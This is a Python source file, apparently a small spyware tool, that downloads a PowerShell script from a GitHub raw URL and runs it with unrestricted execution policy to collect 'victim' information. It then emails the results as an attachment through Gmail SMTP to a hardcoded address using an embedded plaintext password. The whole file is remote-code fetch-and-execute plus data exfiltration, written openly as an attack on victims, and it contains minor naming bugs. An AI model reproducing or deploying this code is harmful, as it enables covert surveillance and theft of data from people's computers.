import argparse,smtplib 
import subprocess as subproc
import urllib.request
from email.mime.multipart import MIMEMultipart 
from email.mime.text import MIMEText 
from email.mime.base import MIMEBase 
from email import encoders 


def get_psfile():
	#when i want to change/add new powershell script. I can renew my file that get_info.ps1 on my github. So script get another some info also..
	file_url = urllib.request.urlopen('https://raw.githubusercontent.com/FerdiGul/PyShellSpy/master/get_info.ps1')
	with open(r'C:\Windows\Temp\test.ps1','wb') as output:
		output.write(file_url.read())

	

def exec_ps():
	parser = argparse.ArgumentParser(description='Sample call to PowerShell function from Python')
	parser.add_argument('--functionToCall', metavar='-f', default='GET_VICTIM_INFO', help='Specify function to run')

	args = parser.parse_args()

	psResult = subProc.Popen([r'C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe',
	'-ExecutionPolicy',
	'unrestricted',
	'. C://Windows//Temp//test.ps1',
	args.functionToCall],
	stdout = subProc.PIPE) # stderr = supProc.PIPE

	output = psResult.communicate() # if you want to use upside please add this area also; => output,error
	#returnCode = psResult.returncode # "Return code given to Python script is: " + str(returnCode)

	doc = open("C://Windows//Temp//get_info.txt","w")
	doc.write(str(args)+"\n\nstdout:\n\n" + str(output))
	doc.close() #finish the process for ps execution



def send_mail(sender,receiver):
	from_mail = "test01malicious@gmail.com"
	to_mail   = "test01malicious@gmail.com"
	message   = MIMEMultipart() 
	message['From'] = from_mail
	message['To'] = to_mail
	message['Subject'] = "You have gotten some information about your victim!"
	body = "Alarm: A new victim detected!"
	message.attach(MIMEText(body, 'plain')) 

	file = "get_info.txt"
	attachment = open("C://Windows//Temp//get_info.txt", "rb") 
	getFile = MIMEBase('application', 'octet-stream') 
	getFile.set_payload((attachment).read()) 
	encoders.encode_base64(getFile) 
	getFile.add_header('Content-Disposition', "attachment; filename= %s" % file) 
	message.attach(getFile) 
	smtp = smtplib.SMTP('smtp.gmail.com', 587) 
	smtp.starttls() 
	smtp.login(from_mail, "2012010213004" ) 
	text = message.as_string() 
	smtp.sendmail(from_mail, to_mail, text) 
	smtp.quit() 

if __name__=="__main__":
	
	get_psfile()
	exec_ps()
	sender="test01malicious@gmail.com"
	receiver="test01malicious@gmail.com"
	send_mail(sender,receiver)

